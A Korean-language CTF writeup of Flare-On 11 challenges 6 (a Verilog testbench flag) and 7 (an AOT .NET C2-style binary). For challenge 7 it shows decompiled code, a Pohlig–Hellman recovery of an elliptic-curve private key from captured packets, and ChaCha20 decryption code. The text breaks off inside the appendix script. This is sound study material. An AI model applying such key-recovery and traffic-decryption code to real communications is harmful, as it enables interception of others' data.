---
layout: post
title: Flare-On 11 Writeup (6-8)
subtitle: Clearly Fake, fullspeed, bloke2
thumbnail-img: /assets/img/writeups/202412/6_1.png
tags: [Writeup, Reversing]
comments: true
ctf: Flare-on 11
color: FFB6B6
ctf_date: 2024-10-27
probs:
  - [6 bloke2, Medium, Reversing, Verilog]
  - [7 fullspeed, Very Hard, Reversing, AOT Compiled .NET / Elliptic-curve Diffie–Hellman]
  - [8 Clearly Fake, Medium, Reversing, Smart Contract / Powershell Deobfuscation]
---

[Flare-On 11 Writeup (1-5)](https://blog.jeongramon.dev/2024/2024-12-02-FlareOn_11_Writeup/)에서 이어지는 글이다. 

{% include problems.html probs=page.probs %}

<br />

# 6. bloke2
`Verilog` 프로젝트가 제공된다. `Verilog`란 `FPGA(Field-Programmable Gate Array)` 등을 설계하는 데에 사용되는 `HDL`이라고 한다. 아래와 같은 시나리오가 주어졌으며, 숨겨진 비밀 메시지를 찾아야 한다.

> One of our lab researchers has mysteriously disappeared.  He was working on the prototype for a hashing IP block that worked very much like, but not identically to, the common Blake2 hash family.  Last we heard from him, he was working on the testbenches for the unit.  One of his labmates swears she knew of a secret message that could be extracted with the testbenches, but she couldn't quite recall how to trigger it.  Maybe you could help?

<br />

## 문제 분석

`Verilog` 언어 자체가 너무 생소하다. 그나마 문제 파일에 `makefile`이 포함되었으므로 이용하여 `make`를 해본다.

```bash
VVP=vvp
IVERILOG=iverilog

VVPFLAGS=
IVERILOGFLAGS=-g2012

targets=bloke2.out

test_targets=f_sched.test bloke2b.test bloke2s.test

deps_bloke2=bloke2.v f_sched.v f_unit.v g_over_2.v g.v g_unit.v data_mgr.v bloke2s.v bloke2b.v

deps_f_sched.test=f_sched.v f_sched_tb.v

deps_bloke2b.test=$(deps_bloke2) bloke2b_tb.v
deps_bloke2s.test=$(deps_bloke2) bloke2s_tb.v

all: $(targets)

tests: $(test_targets)

clean:
	rm -rf $(targets)

.SECONDEXPANSION:

%.out: $$(deps_$$*)
	iverilog $(IVERILOGFLAGS) -o $@ $^

%.test: %.test.out
	vvp $(VVPFLAGS) $^
```

<br />

컴파일 후 실행 시 특이사항이 없다. 대신 `tests`로 빌드한 경우 다음과 같이 특별한 출력 값을 가진다. 

![image.png](/assets/img/writeups/202412/6_1.png)

<br />

문제 시나리오에서도 테스트벤치에 대한 언급이 존재하므로, `tests` 빌드 중 어떤 트리거를 만족시켜야 하는 듯 하다.

> secret message that could be extracted with the testbenches

<br />

## Testbenches

`Testbench`는 `bloke2s`, `bloke2b`에 대하여 각각 1개 총 2개가 존재한다. 각 `Testbench`는 테스트하고자 하는 모듈의 인스턴스를 생성한다.

```cpp
//bloke2s_tb.v
...
bloke2s uut (
		.clk(clk),
		.rst(rst),

		.start(start),
		.finish(finish),

		.din(din),
		.din_valid(din_valid),
		.din_ready(din_ready),
		.din_end(din_end),

		.dout(dout),
		.dout_valid(dout_valid),
		.dout_end(dout_end)
	);
...
```

 <br />

각 모듈은 `bloke2`를 호출하여 데이터를 처리하도록 위임하고, `bloke2`는 `data_mgr.v`를 호출한다.

```cpp
//bloke2.v
...
	data_mgr #(
		.W(W)
	) dmgr (
		.clk(clk),
		.rst(rst),

		.start(start),
		.finish(finish),

		.data_in(din),
		.dv_in(din_valid),
		.drdy_out(din_ready),

		.msg_strobe(msg_strobe),
		.m_out(m),
		.t_out(t),
		.f_out(f),

		.h_in(h_out),
		.h_rdy(f_dv),

		.data_out(dout),
		.dv_out(dout_valid),
		.data_end(dout_end)
	);
...
```

 <br />

`data_mgr.v`에서 `secret message`의 재료로 의심되는 `TEST_VAL`과 이를 처리하는 연산 코드들이 눈에 띈다. `h_in, tst` 등의 값을 건드려서 출력되는 `Received Message` 값을 바꿔줘야 할 듯 하다.

```cpp
...
	always @(posedge clk) begin
		if (rst | start) begin
			m   <= {MSG_BITS{1'b0}};
			cnt <= {CNT_BITS{1'b0}};
			t   <= {(W*2){1'b0}};
			f   <= 1'b0;
			tst <= finish;
...
    localparam TEST_VAL = 512'h3c9cf0addf2e45ef548b011f736cc99144bdfee0d69df4090c8a39c520e18ec3bdc1277aad1706f756affca41178dac066e4beb8ab7dd2d1402c4d624aaabe40;
...
	always @(posedge clk) begin
		if (rst) begin 
			out_cnt <= 0;
		end else begin
			//$display("%t dmgr dout oc %h", $time, out_cnt);
			if (h_rdy) begin
				//$display("%t dmgr dout h %h t %b", $time, h_in, tst);
				out_cnt <= W;
				h <= h_in ^ (TEST_VAL & {(W*16){tst}});
			end else if(out_cnt != 0) begin
				//$display("%t dmgr dout d %h dv %b de %b oc %h", $time, data_out, dv_out, data_end, out_cnt);
				out_cnt <= out_cnt - 1;
				h <= {8'b0, h[W*8-1:8]};
			end
		end
	end
...
```

<br />

## PoC

먼저 `tst` 와 관련 있는 `finish` 값을 `0`에서 `1`로 바꿔보자.

```cpp
		// Set our start and finish lines correctly.
		start <= 1'b1;
		finish <= 1'b0;  // 이걸 b1로 수정
```

<br />

어라? `flag`가 출력되었다. ~~이 언어에 대해서 더이상 자세히 알고 싶지 않으므로 면밀한 분석은 생략한다.~~

![image.png](/assets/img/writeups/202412/6_2.png)


<br />

# 7. fullspeed

.NET exe 파일과 pcap 파일이 주어진다. pcap 파일 내에는 `192.168.56.103:31337`과 패킷 몇 개를 주고받은 기록이 있다.

## 초기 접근

### AOT 

분석 타겟이 닷넷이므로 전용 디컴파일러를 활용하여 분석하려 하였으나, 오류가 발생하였다. 

![image.png](/assets/img/writeups/202412/7_0.png)

<br />

`PEview`로 실행파일의 구조를 확인하니, `.managed`와 `.hydrated` 섹션을 확인하였다. 이 두 섹션은 파일이 `AOT` 컴파일되었을 때 존재한다.

![image.png](/assets/img/writeups/202412/7_1.png)

<br />

우리가 흔히 마주하는 `.NET`은 `JIT` 컴파일 방식으로, 초기 실행 시에 바이트코드를 컴파일하는 과정을 거치는 특징이 있으며, `ILspy`와 같은 전용 디컴파일러로 쉽게 해석이 가능하다. 그러나 `AOT` 방식의 경우 이러한 실행 시점의 컴파일 과정을 거치지 않아 남아있는 심볼이 적고, 앞서 언급한 닷넷 전용 디컴파일러로 디컴파일이 불가하다.

또한 `IDA`에 `.NET AOT` 관련 시그니처가 없는 듯하다... 그래서 `IDA`로 문제 파일을 열면 아래와 같이 시그니처 하나 없는 척박한 바이너리를 마주하게 된다.

![image.png](/assets/img/writeups/202412/7_2.png)

<br />

### BouncyCastle(AOT) FLIRT Signature 생성 / 로드

String Search를 통하여 빌드 과정에서 [BouncyCastle](https://github.com/bcgit/bc-csharp.git)의 `commit 83ebf4a805... version`을 포함하였음을 알 수 있다. 

![image.png](/assets/img/writeups/202412/7_3.png)

<br />

`IDA`에는 바이너리를 분석하여 직접 시그니처를 생성하고, 이를 내가 분석 중인 파일에 로드하는 기능을 제공한다. 이를 `FLIRT Signature`라 부르는데 상세한 방법은 [링크](https://blog.jeongramon.dev/2025-02-15-IDA_FLIRT/)를 참조 바란다. 

`BouncyCastle`을 `AOT Compile`하고, `FLIRT Signature`를 추출한 다음 문제 파일에 로드하면 일부 시그니처를 복원할 수 있다.

![image.png](/assets/img/writeups/202412/7_7.png)

<br />

## 분석

`main logic`은 `main` 함수로부터 쉽게 찾아갈 수 있다.

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int ModuleHandleFromPointer; // esi
  const char **v6; // r8

  if ( !(unsigned __int8)RhInitialize(0LL, argv, envp) )
    return -1;
  ModuleHandleFromPointer = PalGetModuleHandleFromPointer((LPCWSTR)main_2);
  if ( !(unsigned __int8)RhRegisterOSModule(
                           ModuleHandleFromPointer,
                           (unsigned int)sub_7FF615DA7000,
                           (unsigned int)sub_7FF615E78510 - (unsigned int)sub_7FF615DA7000,
                           (unsigned int)sub_7FF615DA5BC0,
                           (unsigned int)sub_7FF615DA6210 - (unsigned int)sub_7FF615DA5BC0,
                           (__int64)off_7FF615F4CF60,
                           14) )
    return -1;
  S_P_CoreLib_Internal_Runtime_CompilerHelpers_StartupCodeHelpers__InitializeModules(
    ModuleHandleFromPointer,
    (unsigned int)&unk_7FF615ED27B0,
    (&unk_7FF615ED27C0 - &unk_7FF615ED27B0) >> 3,
    (unsigned int)off_7FF615F4CF60,
    14);
  return main_2(argc, argv, v6);
}
```

<br />

```cpp
int __fastcall main_2(int argc, const char **argv, const char **envp)
{
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rcx
  int v8; // ebx
  __int64 v10[4]; // [rsp+28h] [rbp-20h] BYREF

  v10[0] = 0LL;
  v10[1] = 0LL;
  RhpReversePInvoke(v10);
  v5 = RhpNewFast(&unk_7FF664A71198);
  *(_DWORD *)(v5 + 72) = -2146233088;
  *(_QWORD *)(v5 + 8) = 0LL;
  *(_DWORD *)(v5 + 72) = -2146233087;
  *(_DWORD *)(v5 + 72) = -2147024882;
  RhpAssignRefAVLocation(qword_7FF664B48768 + 8, v5);
  S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner__Initialize();
  S_P_StackTraceMetadata_Internal_StackTraceMetadata_StackTraceMetadata__Initialize();
  v6 = RhpNewFast(&unk_7FF664A79D50);
  RhpAssignRefAVLocation(qword_7FF664B48970 + 24, v6);
  S_P_Reflection_Execution_Internal_Reflection_Execution_ReflectionExecution__Initialize();
  sub_7FF664A073A0(argc, (__int64)argv);
  qword_7FF664B49B90 = sub_7FF664A07980(&unk_7FF664AA1CC0);
  v7 = *(_QWORD *)(sub_7FF66491205E() + 80);
  if ( !v7 )
    v7 = S_P_CoreLib_System_Threading_Thread__InitializeCurrentThread();
  sub_7FF6649E0840(v7, 1LL, 1LL);
  S_P_CoreLib_Internal_Runtime_CompilerHelpers_StartupCodeHelpers__RunModuleInitializers();
  sub_7FF664A07450();
  mainlogic();
  sub_7FF6649DFF40();
  sub_7FF6649BFEE0();
  if ( qword_7FF664A68C38[-1] )
    sub_7FF6649111D0();
  v8 = qword_7FF664A68C38[0];
  RhpReversePInvokeReturn(v10);
  return v8;
}
```

<br />

### mainlogic()

`pcap` 내용을 봤을 때 예상할 수 있듯, `192.168.56.103:31337`과 패킷을 주고받는 기능을 수행한다. `decrypt_string`의 결과는 동적 분석을 통해 얻어내었다.
`v4 = sub_7FF6649C4000(IP_PORT, (int)v3, 0, 0x7FFFFFFF, 0);`에서 `rcx->offset` 부분에서 `127.0.0.1`로 패치한 다음, 로컬에 임시 서버를 구축하면 원활한 동적 분석이 가능하다.

```cpp
__int64 mainlogic()
{
  ...
  if ( qword_7FF664A68FC0[-1] )
    mainlogic_1();
  v0 = qword_7FF664B48A68;
  IP_PORT = decrypt_string((__int64)&off_7FF664A4EB90);// 192.168.56.103:31337
  v2 = decrypt_string((__int64)&off_7FF664A4F060);// ;
  LODWORD(v3) = v2;
  if ( !v2 )
    v3 = &off_7FF664A4A048;
  v4 = sub_7FF6649C4000(IP_PORT, (int)v3, 0, 0x7FFFFFFF, 0);// 127.0.0.1 patch
  v5 = *(_DWORD *)(v4 + 8);
  if ( !v5 || (v6 = *(_QWORD *)(v4 + 16), v5 <= 1) )
    sub_7FF664A07D00();
  v7 = *(_QWORD *)(v4 + 24);
  if ( !v7 )
    sub_7FF6649D1990(17LL);
  v8 = v7 + 12;
  v9 = *(_DWORD *)(v7 + 8);
  *(_QWORD *)&v16 = v7 + 12;
  DWORD2(v16) = v9;
  CurrentInfo = S_P_CoreLib_System_Globalization_NumberFormatInfo__get_CurrentInfo();
  v11 = S_P_CoreLib_System_Number__TryParseBinaryIntegerStyle_Char__Int32_(&v16, 7LL, CurrentInfo, v17);
  if ( v11 )
  {
    if ( v11 == 1 )
    {
      *(_QWORD *)&v16 = v8;
      DWORD2(v16) = v9;
      sub_7FF664A392F0(&v16);
    }
    sub_7FF664A3F480();
  }
  v12 = v17[0];
  v13 = sub_7FF6649129F0(&unk_7FF664A6EC20);
  sub_7FF6649BCD50(v13, v6, v12);
  RhpAssignRefAVLocation(v0 + 32, v13);
  v14 = sub_7FF6649BCEB0();
  RhpAssignRefAVLocation(v0 + 40, v14);
  mainlogic_2();
  return mainlogic_3();
}
```

<br />

### mainlogic_1()

메인 로직 중 이 부분이 찾기 가장 어렵다. `mainlogic_1()`의 뒷부분은 IP를 설정하고 패킷을 송수신하는 등의 역할임을 쉽게 알아볼 수 있다. 그런데 이에 선행되어야 할 암호화 관련 시드, 키 설정 등이 전혀 보이지 않아 그 앞부분을 한참 뒤졌다.

```cpp
__int64 mainlogic_1()
{
  __int64 result; // rax

  result = qword_7FF664B48A68;
  if ( qword_7FF664A68FB8 )
    return unknown_libname_69(&qword_7FF664A68FB8, qword_7FF664B48A68);
  return result;
}

__int64 __fastcall unknown_libname_69(__int64 *a1, __int64 a2)
{
  S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner__EnsureClassConstructorRun(a1);
  return a2;
}

```

<br />

찾기 어려운 이유는, 런타임 환경에서 반복문을 돌며 `((void (*)(void))v3)();`으로 여러 함수를 동적 호출하는 과정에 `main_logic_1_0()`이 실행되기 떄문이다. ~~악랄하다~~

```cpp
__int64 __fastcall S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner__EnsureClassConstructorRun(
        __int64 *a1)
{
  ...
  if ( *a1 )
  {
    S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner_Cctor__GetCctor((char *)&v12[1] + 8, a1);
    v11 = *((_QWORD *)&v12[1] + 1);
    DWORD1(v12[1]) = v12[2];
    if ( LODWORD(v12[2]) >= *(_DWORD *)(*((_QWORD *)&v12[1] + 1) + 8LL) )
      sub_7FF664A07D00();
    v10 = *(_QWORD *)(*((_QWORD *)&v12[1] + 1) + 32LL * DWORD1(v12[1]) + 16);
    v12[0] = *(__int128 *)((char *)&v12[1] + 8);
    if ( (unsigned int)S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner__DeadlockAwareAcquire(v12, a1) )
    {
      v4 = sub_7FF6649DE700();
      v5 = 32LL * DWORD1(v12[1]);
      v6 = v11;
      v7 = v11 + v5 + 16;
      *(_DWORD *)(v11 + v5 + 40) = v4;
      if ( *a1 )
      {
        v8 = *(_QWORD *)(v6 + v5 + 24);
        if ( v8 )
          RhpThrowEx(v8);
        if ( (v3 & 2) != 0 )
          (*(void (__fastcall **)(_QWORD))(v3 - 2))(*(_QWORD *)(v3 + 6));
        else
          ((void (*)(void))v3)();
        _InterlockedOr(v9, 0);
        *a1 = 0LL;
      }
      *(_DWORD *)(v7 + 24) = 0;
      S_P_CoreLib_System_Threading_Lock__Release();
    }
    v12[0] = *(__int128 *)((char *)&v12[1] + 8);
    return S_P_CoreLib_System_Runtime_CompilerServices_ClassConstructorRunner_Cctor__Release(v12);
  }
  return result;
}
```

<br />

아래 코드는 ECDH(타원곡선 디피헬만) 상에서 타원 곡선을 정의하는 함수로 볼 수 있다. 타원 곡선 정의에 필요한 모든 변수가 로드된다.

```cpp
__int64 mainlogic_1_0()
{
  ...
  q = RhpNewFast(&unk_7FF6E757B268);
  v1 = decrypt_string(&off_7FF6E755FC68);       // c90102faa48f18b5eac1f76bb40a1b9fb0d841712bbe3e5576a7a56976c2baeca47809765283aa078583e1e65172a3fd
  sub_7FF6E748B680(q, v1, 16LL);
  a = RhpNewFast(&unk_7FF6E757B268);
  v3 = decrypt_string(&off_7FF6E755FA90);       // a079db08ea2470350c182487b50f7707dd46a58a1d160ff79297dcc9bfad6cfc96a81c4a97564118a40331fe0fc1327f
  sub_7FF6E748B680(a, v3, 16LL);
  b = RhpNewFast(&unk_7FF6E757B268);
  v5 = decrypt_string(&off_7FF6E755EEC8);       // 9f939c02a7bd7fc263a4cce416f4c575f28d0c1315c4f0c282fca6709a5f9f7f9c251c9eede9eb1baa31602167fa5380
  sub_7FF6E748B680(b, v5, 16LL);
  v6 = RhpNewFast(&unk_7FF6E757B268);
  G_x = decrypt_string(&off_7FF6E755EC18);      // 087b5fe3ae6dcfb0e074b40f6208c8f6de4f4f0679d6933796d3b9bd659704fb85452f041fff14cf0e9aa7e45544f9d8
  sub_7FF6E748B680(v6, G_x, 16LL);
  v8 = RhpNewFast(&unk_7FF6E757B268);
  G_y = decrypt_string(&off_7FF6E755E860);      // 127425c1d330ed537663e87459eaa1b1b53edfe305f6a79b184b3180033aab190eb9aa003e02e9dbf6d593c5e3b08182
  sub_7FF6E748B680(v8, G_y, 16LL);
  curve = RhpNewFast(&unk_7FF6E757B618);
  BouncyCastle_make_curve(curve, q, a, b, 0LL, 0LL, 0);
  if ( qword_7FF6E7578FC0[-1] )
    mainlogic_1();
  v11 = qword_7FF6E7658A68;
  RhpAssignRefAVLocation(qword_7FF6E7658A68 + 8, curve);
  v12 = (*(__int64 (__fastcall **)(_QWORD, __int64, __int64))(**(_QWORD **)(v11 + 8) + 88LL))(
          *(_QWORD *)(v11 + 8),
          v6,
          v8);
  RhpAssignRefAVLocation(v11 + 16, v12);
  random = RhpNewFast(&unk_7FF6E757B188);
  Prng = CreatePrng(&off_7FF6E7569B98, 1LL);
  sub_7FF6E74E0380(random, 0LL);
  RhpAssignRefAVLocation(random + 16, Prng);
  return RhpAssignRefAVLocation(v11 + 24, random);
}
```

<br />

### main_logic_2

동적 분석을 통해 24바이트씩 각각 두 번 씩 패킷을 전송 및 수신함을 확인하였다. main_logic_1에서 ECDH 활용을 위한 곡선 정의가 이루어졌으므로, 이 패킷들은 ECDH 알고리즘 상 세션키를 생성하기 위한 키 교환 과정으로 추측이 가능하다. 이 때 각 사용자 A, B는 `k_a*G`와 `k_b*G` 을 각각 x, y 좌표로 나누어 송수신하고, 결과적으로 세션키는 `k_a*k_b*G`가 된다. ECDH와 별개로 패킷 수신 전후 `1337...` 을 `XOR` 키로 활용하여 추가적인 암호화를 거치고 있다. 

```cpp

__int64 mainlogic_2()
{
  ...
  v0 = qword_7FF6E7658A68;
  xor_key = (_DWORD *)RhpNewFast(&unk_7FF6E757B268);
  v2 = decrypt_string((__int64)&off_7FF6E755E9F8);// 13371337
                                                // 1337133713371337
                                                // 1337133713371337
                                                // 1337133713371337
                                                // 1337133713371337
                                                // 1337133713371337
                                                // 13371337
  sub_7FF6E748B680(xor_key, v2, 16);
  if ( !*(_QWORD *)(v0 + 16) || !*(_QWORD *)(v0 + 40) )
  {
    v43 = RhpNewFast(&unk_7FF6E7580BA8);
    v44 = decrypt_string((__int64)&off_7FF6E755FF20);
    S_P_CoreLib_System_InvalidOperationException___ctor_0(v43, v44);
    RhpThrowEx(v43);
  }
  session_key_128 = sub_7FF6E7527E20(128LL);
  v4 = (*(__int64 (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(v0 + 16) + 224LL))(
         *(_QWORD *)(v0 + 16),
         session_key_128);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 136LL))(v4);
  v6 = v5;
  if ( *(_QWORD *)(v5 + 16) )
    v7 = 0;
  else
    v7 = *(_QWORD *)(v5 + 24) == 0LL;
  if ( v7 )
  {
    v45 = RhpNewFast(&unk_7FF6E7580BA8);
    v46 = decrypt_string((__int64)&off_7FF6E755FF48);
    S_P_CoreLib_System_InvalidOperationException___ctor_0(v45, v46);
    RhpThrowEx(v45);
  }
  v8 = RhpNewArray(&unk_7FF6E75AB688, 48LL);
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 80LL))(v6);
  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v9 + 48LL))(v9);
  x = BouncyCastle_Xor(v10, xor_key);
  *((_QWORD *)&v52 + 1) = v8 + 16;
  LODWORD(v53) = 48;
  sub_7FF6E7490B00(x, 1LL, (char *)&v52 + 8);
  v12 = *(_QWORD *)(v0 + 40);
  v51 = v8 + 16;
  LODWORD(v52) = 48;
  System_Net_Sockets_System_Net_Sockets_NetworkStream__Write_0(v12, &v51);
  v13 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 88LL))(v6);
  v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v13 + 48LL))(v13);
  v15 = BouncyCastle_Xor(v14, xor_key);
  *((_QWORD *)&v52 + 1) = v8 + 16;
  LODWORD(v53) = 48;
  sub_7FF6E7490B00(v15, 1LL, (char *)&v52 + 8);
  v16 = *(_QWORD *)(v0 + 40);
  v51 = v8 + 16;
  LODWORD(v52) = 48;
  System_Net_Sockets_System_Net_Sockets_NetworkStream__Write_0(v16, &v51);
  v17 = *(_QWORD *)(v0 + 40);
  *((_QWORD *)&v52 + 1) = v8 + 16;
  LODWORD(v53) = 48;
  System_Net_Sockets_System_Net_Sockets_NetworkStream__Read_0(v17, (char *)&v52 + 8);
  v18 = RhpNewFast(&unk_7FF6E757B268);
  if ( *(&qword_7FF6E7578AC8 - 1) )
    sub_7FF6E7421454();
  sub_7FF6E748C1A0(v18, 1, v8, 0, 48, 1);
  y = BouncyCastle_Xor(v18, xor_key);
  v20 = *(_QWORD *)(v0 + 40);
  *((_QWORD *)&v52 + 1) = v8 + 16;
  LODWORD(v53) = 48;
  System_Net_Sockets_System_Net_Sockets_NetworkStream__Read_0(v20, (char *)&v52 + 8);
  v21 = RhpNewFast(&unk_7FF6E757B268);
  sub_7FF6E748C1A0(v21, 1, v8, 0, 48, 1);
  v22 = BouncyCastle_Xor(v21, xor_key);
  v23 = (*(__int64 (__fastcall **)(_QWORD, __int64, __int64))(**(_QWORD **)(v0 + 8) + 80LL))(
          *(_QWORD *)(v0 + 8),
          y,
          v22);
  v24 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v23 + 224LL))(v23, session_key_128);
  v25 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v24 + 136LL))(v24);
  v26 = v25;
```

<br />

ECDH로 생산한 세션키를 즉시 대칭키로 사용하지는 않는다. 세션키에 `SHA512` 연산을 거쳐 그 값을 `chacha20` 암호화의 `key`와 `nonce`로 활용한다. 최초로 `chacha20` 디코딩한 값이 `verify`이면 인증을 성공한다.

```cpp
  ...
   hash_val = SHA512(v8);
  if ( hash_val )
  {
    hash_vall = hash_val + 16;
    v32 = *(_DWORD *)(hash_val + 8);
  }
  else
  {
    hash_vall = 0LL;
    v32 = 0;
  }
  if ( v32 < 0x28 )
    sub_7FF6E74E1670();
  v33 = RhpNewFast(&unk_7FF6E757C6C0);
  if ( *((_QWORD *)&unk_7FF6E7578AF8 - 1) )
    sub_7FF6E74210AE();
  sub_7FF6E749C8A0(v33, unk_7FF6E7578AF8);
  RhpAssignRefAVLocation(v0 + 48, v33);
  v34 = RhpNewFast(&unk_7FF6E757C5B8);
  v35 = RhpNewArray(&unk_7FF6E75AB688, 32LL);
  v1 = *(_OWORD *)(hash_vall + 16);
  *(_OWORD *)(v35 + 16) = *(_OWORD *)hash_vall;
  *(_OWORD *)(v35 + 32) = v1;
  RhpAssignRefAVLocation(v34 + 8, v35);
  v37 = RhpNewFast(&unk_7FF6E757C610);
  RhpAssignRefAVLocation(v37 + 8, v34);
  v38 = RhpNewArray(&unk_7FF6E75AB688, 8LL);
  *(_QWORD *)(v38 + 16) = *(_QWORD *)(hash_vall + 32);
  RhpAssignRefAVLocation(v37 + 16, v38);
  unk_7FF6E757A6C0(*(_QWORD *)(v0 + 48), 1LL, v37);
  decoded_first_message = chacha_decode_recieved_message();
  v40 = decrypt_string((__int64)&off_7FF6E7560100);// verify
  if ( !(unsigned int)String__Equals_0(decoded_first_message, v40) )
  {
    v49 = RhpNewFast(&unk_7FF6E7580BA8);
    v50 = decrypt_string((__int64)&off_7FF6E7560130);// verify failed
    S_P_CoreLib_System_InvalidOperationException___ctor_0(v49, v50);
    RhpThrowEx(v49);
  }
  v41 = decrypt_string((__int64)&off_7FF6E7560100);// verify
  return sub_7FF6E7528540(v41);
}
```

<br />

## PoC

ECDH의 곡선 및 기준점 설정을 위한 값은 정해져 있지만, 세션키를 생성하기 위한 개인 키는 랜덤 생성된다. 결국 pcap 파일에서 얻은 키교환 패킷을 이용하여 ECDH 자체를 깨야 한다.

<br />

### 폴링헬만 알고리즘

ECDH의 교환 키를 이용해 개인 키를 크래킹하는 [폴링헬만 알고리즘](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)이 존재한다. 간단히 설명해보겠다.

ECDH를 타원곡선이라는 ~~잘 모르겠는~~ 개념을 제쳐두고 요약하면, 일반 디피헬만 알고리즘처럼 `kG = x (mod P)` 에서 `k`를 구하는 것이 어렵다는 점에서 기인하는 것이다. 지금 목표도 `k`를 크래킹 하는 것이고...

이 때 `P = (p_1^e_1) * (p_2^_e2) * ...`와 같이 소인수 분해해서 표현할 수 있을텐데, 각 `p_n`에 대해서 `kG=x (mod p_n)` 문제를 푸는 건 당연히 더 쉽다!(`p`보다 `p_n`이 훨씬 작으므로) 원 문제를 이러한 작은 소수 `p_n`들에 대한 각각의 `k_n`을 구하는 문제로 치환하면 `k_n`을 구할 수 있을 뿐만 아니라, `k_n`들을 조합하여 원본 `k`를 구할 수 있다. 조합은 중국인의 나머지 정리를 이용한다.

물론 이러한 크래킹이 항상 가능하다면 ECDH가 지금처럼 일반적으로 사용되고 있을 수는 없을 것이다... `문제가 쉬워진다`라는 조건을 만족하는 `P` 값들의 특징이 있다. 그렇지만 결론적으로 이 문제에서는 이러한 조건을 만족하여 위 알고리즘을 활용 가능하다는 점만 언급하고, 더 이상 깊이 파고들지는 않겠다. ~~수학 시간은 여기까지다.~~

![image.png](/assets/img/okay.jpg)

<br />

### 폴링헬만 알고리즘 구현

폴링헬만 알고리즘을 구현한 [sage 소스코드](https://github.com/pwang00/Cryptographic-Attacks/blob/master/Public%20Key/Diffie%20Hellman/pohlig_hellman_EC.sage)를 발견하여 커스터마이징하였다. [sagemath 설치 방법](https://doc.sagemath.org/html/en/installation/index.html)은 링크를 참조 바란다. 앞서 정적/동적 분석을 통해 타원 곡선 및 기준점 정의 등에 필요한 값을 모두 얻었다. `k_a*G` 등 키교환에 쓰이는 값은 `main_logic_2()`에서 보았듯 송수신한 패킷에 정해진 `xor_key`를 `XOR` 연산하면 얻을 수 있다.(부록 참조)

폴링헬만 알고리즘 코드를 실행하면, `P`를 인수분해를 하고 각 `p_n`에 대하여 연산을 수행한다. 그러나 이 소수 리스트 중 1개의 값이 너무 커, 컴퓨터가 이 소수와 관련한 연산을 완료하지 못한다.~~적어도 내 컴퓨터는 그렇다.~~ 일단 인수분해한 소수 리스트에서 이 큰 소수 1개를 삭제하면 연산을 빠른 시간 내로 마무리할 수 있다. 물론 마지막 소수에 대한 연산이 이루어지지 않았으므로 얻는 키 값은 약간 틀리다.

![image.png](/assets/img/writeups/202412/7_8.jpg)

<br />

얻은 키 값의 배수 중에서 정답 키 값이 존재할 것이므로, 다음과 같이 찾은 키의 배수 중 진짜 키를 찾는 로직을 추가하여 연산을 간소화할 수 있다. `e`가 모두 1이므로 간단히 `prod(factors)`로 `m`을 만들었다. 풀 코드는 부록 참조.

```python
    m = prod(factors)
    for i in range(n // m):
        kA = kA_maybe + m * i
        if kA * G == PA:
            break
    
    return 
```

<br />

해독에 필요한 공유 키는 `k_A * (k_B * G)`, 즉 `K_A *PB`이다!

<br />

### chacha20 

`pcap` 파일 내 암호화된 패킷을 모두 `chacha20`으로 해독하면 된다! 앞서 설명하였듯 key, nonce는 공유키의 해시값이다.

```python
def decrypt(shared_key):
    ciphers = [
        'f272d54c31860f',
        '3fbd43da3ee325',
        '86dfd7',
        'c50cea1c4aa064c35a7f6e3ab0258441ac1585c36256dea83cac93007a0c3a29864f8e285ffa79c8eb43976d5b587f8f35e699547116',
        'fcb1d2cdbba979c989998c',
        '61490b',
        'ce39da',
        '577011e0d76ec8eb0b8259331def13ee6d86723eac9f0428924ee7f8411d4c701b4d9e2b3793f6117dd30dacba',
        '2cae600b5f32cea193e0de63d709838bd6',
        'a7fd35',
        'edf0fc',
        '802b15186c7a1b1a475daf94ae40f6bb81afcedc4afb158a5128c28c91cd7a8857d12a661acaec',
        'aec8d27a7cf26a17273685',
        '35a44e',
        '2f3917',
        'ed09447ded797219c966ef3dd5705a3c32bdb1710ae3b87fe66669e0b4646fc416c399c3a4fe1edc0a3ec5827b84db5a79b81634e7c3afe528a4da15457b637815373d4edcac2159d056',
        'f5981f71c7ea1b5d8b1e5f06fc83b1def38c6f4e694e3706412eabf54e3b6f4d19e8ef46b04e399f2c8ece8417fa',
        '4008bc',
        '54e41e',
        'f701fee74e80e8dfb54b487f9b2e3a277fa289cf6cb8df986cdd387e342ac9f5286da11ca2784084',
        '5ca68d1394be2a4d3d4d7c82e5',
        '31b6dac62ef1ad8dc1f60b79265ed0deaa31ddd2d53aa9fd9343463810f3e2232406366b48415333d4b8ac336d4086efa0f15e6e59',
        '0d1ec06f36'
    ]

    hash_origin = sha512(shared_key.to_bytes()).digest()
    key = hash_origin[:32]
    nonce = hash_origin[32:40]
    
    cipher = ChaCha20.new(key=key, nonce=nonce)
    for ciphertext in ciphers:
        print(cipher.decrypt(bytes.fromhex(ciphertext)))
```

<br />

해독 결과 중 base64로 인코딩된 것을 디코딩해보면 플래그를 확인할 수 있다.
`D0nt_U5e_y0ur_Own_CuRv3s@flare-on.com`

<br />

## 부록

### PoC.sage

```python
from hashlib import sha512

from Crypto.Cipher import ChaCha20

def generate_params():
    p = int("c90102faa48f18b5eac1f76bb40a1b9fb0d841712bbe3e5576a7a56976c2baeca47809765283aa078583e1e65172a3fd", 16)
    a = int("a079db08ea2470350c182487b50f7707dd46a58a1d160ff79297dcc9bfad6cfc96a81c4a97564118a40331fe0fc1327f", 16)
    b = int("9f939c02a7bd7fc263a4cce416f4c575f28d0c1315c4f0c282fca6709a5f9f7f9c251c9eede9eb1baa31602167fa5380", 16)
